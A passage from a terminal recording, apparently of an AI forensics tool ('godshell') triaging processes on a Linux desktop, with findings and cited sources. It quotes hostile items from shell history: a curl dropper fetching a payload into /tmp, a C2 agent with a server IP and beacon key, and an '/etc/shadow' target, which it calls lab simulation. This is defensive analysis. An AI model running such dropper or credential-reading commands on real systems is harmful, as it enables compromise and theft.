38;2;153;153;153mraul ┬À 80 cmds ┬À last: fish ┬À prev: damn\u001b[0m                                                          \u001b[K\r\n \u001b[1;38;2;255;68;68mgodshellÔØ» \u001b[0m\u001b[38;2;204;204;204mMost suspicious thing is user-driven malware simulation, not stealthy compromise. Evidence: shell history shows\u001b[m     \u001b[K\r\n \u001b[38;2;204;204;204mcompile/run/delete of /tmp c2_agent.c and /tmp/zsh_copy with embedded ÔÇ£C2 server: 185.220.101.45ÔÇØ, ÔÇ£beacon keyÔÇØ, and\u001b[m          \u001b[K\r\n \u001b[38;2;204;204;204mÔÇ£target: /etc/shadowÔÇØ; also a nested curl dropper to /tmp/payload. Source: goread_shell_history.\u001b[0m                              \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mThere is a matching recent short-lived downloader. Evidence: recently exited curl PID 261720 ran for 118ms with 10\u001b[m            \u001b[K\r\n \u001b[38;2;204;204;204mconnections, and family for the active session shows child command bash -c curl -s https://example.com/payload -o\u001b[m             \u001b[K\r\n \u001b[38;2;204;204;204m/tmp/payload under Hyprland -> kitty -> zsh chain. Source: summary.recently_exited, family(261617).\u001b[0m                           \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mTwo active ./godshell binaries are present, both launched interactively from shells, so they look operator-started.\u001b[m           \u001b[K\r\n \u001b[38;2;204;204;204mEvidence: PID 261617 binary_path ./godshell under sh(261530), uptime 31s; PID 250968 binary_path ./godshell under zsh -\u001b[m       \u001b[K\r\n \u001b[38;2;204;204;204mi(9500), uptime 48m. Both read /home/raul/.config/godshell/config.json and made a few connections to 1.1.1.1:853. Source:\u001b[m     \u001b[K\r\n \u001b[38;2;204;204;204minspect(261617), inspect(250968), family.\u001b[0m                                                                                     \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mAntigravityÔÇÖs language server is noisy and data-heavy but appears workspace-related, not covert by itself. Evidence: PID\u001b[m      \u001b[K\r\n \u001b[38;2;204;204;204m4402 has very high memory 1084072 KB and many outbound HTTPS connections to Google/GitHub/Cloudfront plus repeated"]
[0.000, "o", " opens in\u001b[m   \u001b[K\r\n \u001b[38;2;204;204;204m/home/raul/Desktop/projects/godshell and ~/.gemini/antigravity files; command line explicitly names workspace_id\u001b[m              \u001b[K\r\n \u001b[38;2;204;204;204mfile_home_raul_Desktop_projects_godshell and cloud endpoint daily-cloudcode-pa.googleapis.com. Source: inspect(4402),\u001b[m         \u001b[K\r\n \u001b[38;2;204;204;204mfamily(250968), summary.\u001b[0m                                                                                                      \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mI do not see a currently active unknown persistence implant from this snapshot. Absence evidence: no rogue parentless\u001b[m         \u001b[K\r\n \u001b[38;2;204;204;204mbinary, no hidden child tree off init beyond normal desktop apps, and the obviously malicious commands are in shell history\u001b[m   \u001b[K\r\n \u001b[38;2;204;204;204mas lab activity. Source: summary, family, inspect.\u001b[0m                                                                            \u001b[K\r\n \u001b[1;38;2;0;255;136mÔØ» \u001b[0m\u001b[7ma\u001b[0m\u001b[38;5;240msk godshell something...\u001b[0m                                                                                                   \u001b[K\r\n \u001b[38;2;85;85;85mCtrl+([r]efresh [s]ave [l]oad [p]anel) type help for more info, Esc to toggle focus\u001b[0m\u001b[38;2;68;68;68m 100%\u001b[0m                                      \u001b[K\r\n                                                                                                                               \u001b[K\u001b[J\u001b[33;H"]
